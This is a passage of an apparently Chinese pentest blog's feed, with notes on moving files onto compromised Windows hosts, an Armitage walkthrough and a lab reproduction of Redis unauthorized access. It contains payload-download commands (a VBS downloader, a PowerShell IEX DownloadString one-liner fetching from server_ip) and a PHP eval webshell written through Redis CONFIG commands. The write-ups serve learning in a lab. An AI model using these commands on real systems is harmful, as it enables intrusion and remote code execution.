title="2.7-zip"></a>2.7-zip</h3><blockquote><p>这里提取7z.exe，参数如下</p></blockquote><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-r</td><td>递归压缩</td></tr><tr><td>-o</td><td>指定输出目录</td></tr><tr><td>-p</td><td>指定密码</td></tr><tr><td>-v</td><td>分卷压缩</td></tr><tr><td>a</td><td>添加压缩文件</td></tr></tbody></table><h2 id="0x07-上传下载"><a href="#0x07-上传下载" class="headerlink" title="0x07.上传下载"></a>0x07.上传下载</h2><p>对于不能上传shell，但是可以执行命令的windows服务器，可以进行上传和下载操作</p><h3 id="1-ftp协议上传下载"><a href="#1-ftp协议上传下载" class="headerlink" title="1.ftp协议上传下载"></a>1.ftp协议上传下载</h3><p><code>常用命令</code></p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>open &lt;服务器地址&gt;</td><td>链接服务器</td></tr><tr><td>cd &lt;目录名&gt;</td><td>进入指定目录</td></tr><tr><td>lcd &lt;文件夹路径&gt;</td><td>定位本地文件夹（上传文件的位置或者下载文件的本地位置）</td></tr><tr><td>type</td><td>查看当前的传输方式</td></tr><tr><td>ascii</td><td>设置传输方式为ascii码（TXT文件等）</td></tr><tr><td>binary</td><td>设置传输方式为二进制传输（EXE文件，图片，视频）</td></tr><tr><td>close</td><td>结束与ftp服务器的会话</td></tr><tr><td>quit</td><td>结束与ftp服务器的会话并退出ftp环境</td></tr><tr><td>put &lt;文件名&gt; [新的文件名]</td><td>上传，[]内容不指定则不修改</td></tr><tr><td>send &lt;文件名&gt; [新的文件名]</td><td>上传，[]内容不指定则不修改</td></tr><tr><td>get &lt;文件名&gt; [新的文件名]</td><td>下载，[]内容不指定则不修改</td></tr><tr><td>mget &lt;文件名&gt; [文件名…]</td><td>下载多个文件，支持空格和?通配符，如下载所有MP3文件：mget .mp3</td></tr></tbody></table><h3 id="2-vbs上传"><a href="#2-vbs上传" class="headerlink" title="2.vbs上传"></a>2.vbs上传</h3><blockquote><p>利用vbs上传主要使用msxm12.xmlhttp和adobd.stream对象，download.vbs文件：</p><p>使用echo 内容 &gt;&gt; download.vbs逐行写入后执行</p><p>Cscript download.vbs</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Set Post = CreateObject(&quot;Msxm12.XMLHTTP&quot;)</span><br><span class="line">Set Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;,&quot;http://server_ip/target.exe&quot;,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\Test\target.exe&quot;,2</span><br></pre></td></tr></table></figure><h3 id="3-Nishang上传"><a href="#3-Nishang上传" class="headerlink" title="3.Nishang上传"></a>3.Nishang上传</h3><blockquote><p>Nishang将上传的EXE文件转换为十六进制的形式然后用echo访问目标服务器最后使用Download_Execute脚本下载。<br>先利用Nishang中的exetotext.ps1脚本将Metasploit生成的msf.exe修改问msf.txt：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ ExetoText c\:msf.exe c:\msf.txt</span><br></pre></td></tr></table></figure><blockquote><p>接着通过echo将hex值添加到目标文件中，调用Download_Execute：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Download_Execute http://server_ip/target.txt</span><br></pre></td></tr></table></figure><h3 id="4-Debug上传"><a href="#4-Debug上传" class="headerlink" title="4.Debug上传"></a>4.Debug上传</h3><h3 id="5-bitsadmin下载"><a href="#5-bitsadmin下载" class="headerlink" title="5.bitsadmin下载"></a>5.bitsadmin下载</h3><blockquote><p>bitsadmin不支持HTTPS和FTP，且在Windows XP/Server 2003及以前的版本无法使用，Windows7/8/10自带。</p></blockquote><h3 id="6-PowerShell下载"><a href="#6-PowerShell下载" class="headerlink" title="6.PowerShell下载"></a>6.PowerShell下载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX(New-Object System.Net.Webclient).DownloadString(&#x27;https://server_ip/target.exe&#x27;);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-基础知识&quot;&gt;&lt;a href=&quot;#0x01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x01.基础知识&quot;&gt;&lt;/a&gt;0x01.基础知识&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;完成内网信息搜集后，需要先判断流量是否出得去、进得来。隐藏通信隧道技术常用于在访问受限的网络环境中追踪数据流向和在非受信任的网络中实现安全的数据传输。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h3&gt;&lt;p&gt;​        在渗透场景中，各种安全设备会检查对外连接的情况，如果发现异常，就会对通信进行阻断。因此建立专门的隐蔽隧道就十分必要，这能绕过端口屏蔽。&lt;br&gt;常用的隧道如下：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;网络层隧道：IPv6、ICMP、GRE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;传输层隧道：TCP、UDP、常规端口转发&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;应用层隧道：SSH、HTTP、HTTPS、DNS&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Armitage</title>
    <link href="https://lunamoore.github.io/2021/07/19/Armitage/"/>
    <id>https://lunamoore.github.io/2021/07/19/Armitage/</id>
    <published>2021-07-19T09:33:15.000Z</published>
    <updated>2021-07-19T09:49:21.195Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Armitage"><a href="#Armitage" class="headerlink" title="Armitage"></a>Armitage</h1><h2 id="0x01-什么是Armitage"><a href="#0x01-什么是Armitage" class="headerlink" title="0x01.什么是Armitage"></a>0x01.什么是Armitage</h2><blockquote><p>Armitage 是一个用于<span class="exturl" data-url="aHR0cDovL3d3dy5tZXRhc3Bsb2l0LmNvbS8=">Metasploit<i class="fa fa-external-link-alt"></i></span>的<span class="exturl" data-url="aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCM4">可编写脚本的<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCNtdWx0aQ==">红队协作<i class="fa fa-external-link-alt"></i></span>工具，可将目标可视化、推荐漏洞利用并公开框架中的高级后漏洞利用功能。</p><p>通过一个 Metasploit 实例，您的团队将：</p><ul><li>使用相同的会话</li><li>共享主机、捕获的数据和下载的文件</li><li>通过共享事件日志进行通信。</li><li>运行机器人以自动执行红队任务。</li></ul><p>Armitage 是<span class="exturl" data-url="aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk">红队行动<i class="fa fa-external-link-alt"></i></span>的<span class="exturl" data-url="aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk">力量倍增器<i class="fa fa-external-link-alt"></i></span>。</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS8=">Cobalt Strike<i class="fa fa-external-link-alt"></i></span>是用于<span class="exturl" data-url="aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA4LzAzL3JhcGhhZWxzLW1hZ2ljLXF1YWRyYW50Lw==">对手模拟<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA3LzA5L21vZGVscy1mb3ItcmVkLXRlYW0tb3BlcmF0aW9ucy8=">红队行动<i class="fa fa-external-link-alt"></i></span>的工具集。截至 2015 年 10 月，Cobalt Strike 不与 Armitage 共享代码，也不依赖于 Metasploit 框架。您可以使用 Armitage 通过 Metasploit 漏洞利用来触发 Cobalt Strike 的 Beacon 有效载荷。您还可以通过 Cobalt Strike Beacon 隧道传输 Metasploit 攻击。</p></blockquote><a id="more"></a><h2 id="0x02-安装使用"><a href="#0x02-安装使用" class="headerlink" title="0x02.安装使用"></a>0x02.安装使用</h2><p><code>首先进入armitage目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/armitage]</span><br><span class="line">└─# ./teamserver 192.168.1.7 pass</span><br><span class="line">[*] Generating X509 certificate and keystore (for SSL)</span><br><span class="line">[*] Starting RPC daemon</span><br><span class="line">[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg...</span><br><span class="line">[*] MSGRPC backgrounding at 2021-07-19 05:02:00 -0400...</span><br><span class="line">[*] MSGRPC background PID 8183</span><br><span class="line">[*] sleeping for 20s (to let msfrpcd initialize)</span><br><span class="line">[*] Starting Armitage team server</span><br><span class="line">[*] Use the following connection details to connect your clients:</span><br><span class="line">        Host: 192.168.1.7</span><br><span class="line">        Port: 55553</span><br><span class="line">        User: msf</span><br><span class="line">        Pass: pass</span><br><span class="line"></span><br><span class="line">[*] Fingerprint (check for this string when you connect):</span><br><span class="line">        6ad0a753836d3ae33fc409bcc19c4523b1701210</span><br><span class="line">[+] hacking is such a lonely thing, until now</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>客户端连接即可</code></p><img src="/2021/07/19/Armitage/image-20210719170502446.png" class><img src="/2021/07/19/Armitage/image-20210719170541740.png" class><h2 id="0x03-Redis未授权访问利用"><a href="#0x03-Redis未授权访问利用" class="headerlink" title="0x03.Redis未授权访问利用"></a>0x03.Redis未授权访问利用</h2><blockquote><p>之前复现过Redis未授权访问漏洞，手头环境还没销毁。。。</p></blockquote><h3 id="01-搜索Redis"><a href="#01-搜索Redis" class="headerlink" title="01.搜索Redis"></a>01.搜索Redis</h3><img src="/2021/07/19/Armitage/image-20210719170906841.png" class><h3 id="02-redis-replication-cmd-exec利用"><a href="#02-redis-replication-cmd-exec利用" class="headerlink" title="02.redis_replication_cmd_exec利用"></a>02.redis_replication_cmd_exec利用</h3><p><code>双击即可进行配置</code></p><img src="/2021/07/19/Armitage/image-20210719171145861.png" class><h3 id="03-点击Launch即可利用"><a href="#03-点击Launch即可利用" class="headerlink" title="03.点击Launch即可利用"></a>03.点击Launch即可利用</h3><p><code>利用成功</code></p><img src="/2021/07/19/Armitage/image-20210719171315981.png" class><h3 id="04-shell获取"><a href="#04-shell获取" class="headerlink" title="04.shell获取"></a>04.shell获取</h3><p><code>右键</code></p><img src="/2021/07/19/Armitage/image-20210719171405205.png" class><p><code>获取root shell</code></p><img src="/2021/07/19/Armitage/image-20210719171509977.png" class>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Armitage&quot;&gt;&lt;a href=&quot;#Armitage&quot; class=&quot;headerlink&quot; title=&quot;Armitage&quot;&gt;&lt;/a&gt;Armitage&lt;/h1&gt;&lt;h2 id=&quot;0x01-什么是Armitage&quot;&gt;&lt;a href=&quot;#0x01-什么是Armitage&quot; class=&quot;headerlink&quot; title=&quot;0x01.什么是Armitage&quot;&gt;&lt;/a&gt;0x01.什么是Armitage&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Armitage 是一个用于&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5tZXRhc3Bsb2l0LmNvbS8=&quot;&gt;Metasploit&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;的&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCM4&quot;&gt;可编写脚本的&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt; &lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCNtdWx0aQ==&quot;&gt;红队协作&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;工具，可将目标可视化、推荐漏洞利用并公开框架中的高级后漏洞利用功能。&lt;/p&gt;
&lt;p&gt;通过一个 Metasploit 实例，您的团队将：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用相同的会话&lt;/li&gt;
&lt;li&gt;共享主机、捕获的数据和下载的文件&lt;/li&gt;
&lt;li&gt;通过共享事件日志进行通信。&lt;/li&gt;
&lt;li&gt;运行机器人以自动执行红队任务。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Armitage 是&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk&quot;&gt;红队行动&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;的&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk&quot;&gt;力量倍增器&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS8=&quot;&gt;Cobalt Strike&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;是用于&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA4LzAzL3JhcGhhZWxzLW1hZ2ljLXF1YWRyYW50Lw==&quot;&gt;对手模拟&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;和&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA3LzA5L21vZGVscy1mb3ItcmVkLXRlYW0tb3BlcmF0aW9ucy8=&quot;&gt;红队行动&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;的工具集。截至 2015 年 10 月，Cobalt Strike 不与 Armitage 共享代码，也不依赖于 Metasploit 框架。您可以使用 Armitage 通过 Metasploit 漏洞利用来触发 Cobalt Strike 的 Beacon 有效载荷。您还可以通过 Cobalt Strike Beacon 隧道传输 Metasploit 攻击。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="kali" scheme="https://lunamoore.github.io/categories/kali/"/>
    
    <category term="Armitage" scheme="https://lunamoore.github.io/categories/kali/Armitage/"/>
    
    
    <category term="Armitage" scheme="https://lunamoore.github.io/tags/Armitage/"/>
    
    <category term="Redis" scheme="https://lunamoore.github.io/tags/Redis/"/>
    
    <category term="security tools" scheme="https://lunamoore.github.io/tags/security-tools/"/>
    
  </entry>
  
  <entry>
    <title>Redis未授权访问</title>
    <link href="https://lunamoore.github.io/2021/07/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>https://lunamoore.github.io/2021/07/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2021-07-19T07:40:38.000Z</published>
    <updated>2021-07-19T08:04:24.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote><p>Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务器登录目标服务器。</p><p>漏洞的产生条件有以下两点:</p><p>(1)  Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</p><p>(2)  没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</p></blockquote><a id="more"></a><h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><p>Redis 2.x，3.x，4.x，5.x</p><h2 id="三、漏洞危害"><a href="#三、漏洞危害" class="headerlink" title="三、漏洞危害"></a>三、漏洞危害</h2><p>(1) 攻击者无需认证访问到内部数据,可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据</p><p>(2) 攻击者可通过eval执行lua代码，或通过数据备份功能往磁盘写入后门文件</p><p>(3) 如果redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器 </p><h2 id="四、复现过程"><a href="#四、复现过程" class="headerlink" title="四、复现过程"></a>四、复现过程</h2><blockquote><p>环境：</p><p>kali：192.168.1.7</p><p>redis(centos7)：192.168.1.9</p></blockquote><h3 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1.环境安装"></a>1.环境安装</h3><p><code>本次使用4.0.0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">从官网wget到本地</span><br><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.0.tar.gz </span><br><span class="line">tar xzf redis-4.0.0.tar.gz</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">去掉ip绑定，允许除本地外的主机远程登录redis服务</span><br><span class="line">(1)bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0</span><br><span class="line">(2)protected-mode设为no</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure><p><code>登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt; keys *</span><br><span class="line">(empty list or set)</span><br><span class="line">192.168.1.9:6379&gt;</span><br></pre></td></tr></table></figure><p><code>攻击者常用命令</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（1）info                       查看信息     </span><br><span class="line">（2）flushall                 删除所有缓存数据库：</span><br><span class="line">（3）flushdb                    刷新数据库</span><br><span class="line">（4）看所有键：KEYS *，使用select num可以查看键值数据。</span><br><span class="line">（5）set test &quot;who am i&quot;        设置变量</span><br><span class="line">（6）config set dir dirpath     设置路径等配置</span><br><span class="line">（7）config get dir&#x2F;dbfilename  获取路径及数据配置信息</span><br><span class="line">（8）save                       保存</span><br><span class="line">（9）get                        变量，查看变量名称</span><br></pre></td></tr></table></figure><h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><h4 id="01-写入后门文件"><a href="#01-写入后门文件" class="headerlink" title="01.写入后门文件"></a>01.写入后门文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /tmp</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; SET webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">[root@mail tmp]# ll shell.php</span><br><span class="line">-rw-r--r--. 1 root root 191 Jul 18 02:19 shell.php</span><br><span class="line">[root@mail tmp]# cat shell.php</span><br><span class="line">REDIS0008▒      redis-ver4.0.0▒</span><br><span class="line">redis-bits▒@▒ctime▒▒▒▒`used-mem�▒</span><br><span class="line">▒</span><br><span class="line">aof-preamble▒▒repl-id(2bb416a4f7439bfd8932320f435556c4747d5e64▒</span><br><span class="line">                                                               repl-offset▒▒webshell&lt;?php phpinfo();?&gt;▒hތ▒S▒+,[root@mail tmp]# xterm-256colorxterm-256color</span><br><span class="line">-bash: xterm-256colorxterm-256color: command not found</span><br><span class="line">[root@mail tmp]#</span><br></pre></td></tr></table></figure><p><code>另一种写入webshell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /tmp</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; SET demo &quot;\n\n\n&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename web.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line"></span><br><span class="line">[root@mail tmp]# cat web.php</span><br><span class="line">REDIS0008▒      redis-ver4.0.0▒</span><br><span class="line">redis-bits▒@▒ctime▒▒`used-mem▒؜</span><br><span class="line">▒</span><br><span class="line">aof-preamble▒▒repl-id(2bb416a4f7439bfd8932320f435556c4747d5e64▒</span><br><span class="line">                                                               repl-offset▒▒▒demo#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">                                                                                                                       ▒▒?▒▒/▒[root@mail tmp]# xterm-256colorxterm-256color</span><br><span class="line">-bash: xterm-256colorxterm-256color: command not found</span><br><span class="line">[root@mail tmp]#</span><br></pre></td></tr></table></figure><h4 id="02-MSF进行利用"><a href="#02-MSF进行利用" class="headerlink" title="02.MSF进行利用"></a>02.MSF进行利用</h4><p><code>共有5个模块可以利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search redis</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                                      Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                      ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/ibm_bigfix_sites_packages_enum           2019-03-18       normal     No     IBM BigFix Relay Server Sites and Package Enum</span><br><span class="line">   1  exploit/windows/browser/ie_createobject                   2006-04-11       excellent  No     MS06-014 Microsoft Internet Explorer COM CreateObject Code Execution</span><br><span class="line">   2  auxiliary/scanner/redis/redis_server                                       normal     No     Redis Command Execute Scanner</span><br><span class="line">   3  auxiliary/gather/redis_extractor                                           normal     Yes    Redis Extractor</span><br><span class="line">   4  auxiliary/scanner/redis/file_upload                       2015-11-11       normal     No     Redis File Upload</span><br><span class="line">   5  auxiliary/scanner/redis/redis_login                                        normal     No     Redis Login Utility</span><br><span class="line">   6  exploit/linux/redis/redis_replication_cmd_exec            2018-11-13       good       Yes    Redis Replication Code Execution</span><br><span class="line">   7  exploit/windows/browser/webex_ucf_newobject               2008-08-06       good       No     WebEx UCF atucfobj.dll ActiveX NewObject Method Buffer Overflow</span><br><span class="line">   8  exploit/windows/browser/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)</span><br><span class="line">   9  exploit/windows/email/ms07_017_ani_loadimage_chunksize    2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 9, use 9 or use exploit/windows/email/ms07_017_ani_loadimage_chunksize</span><br></pre></td></tr></table></figure><h5 id="1-exploit-linux-redis-redis-replication-cmd-exec"><a href="#1-exploit-linux-redis-redis-replication-cmd-exec" class="headerlink" title="1.exploit/linux/redis/redis_replication_cmd_exec"></a>1.exploit/linux/redis/redis_replication_cmd_exec</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 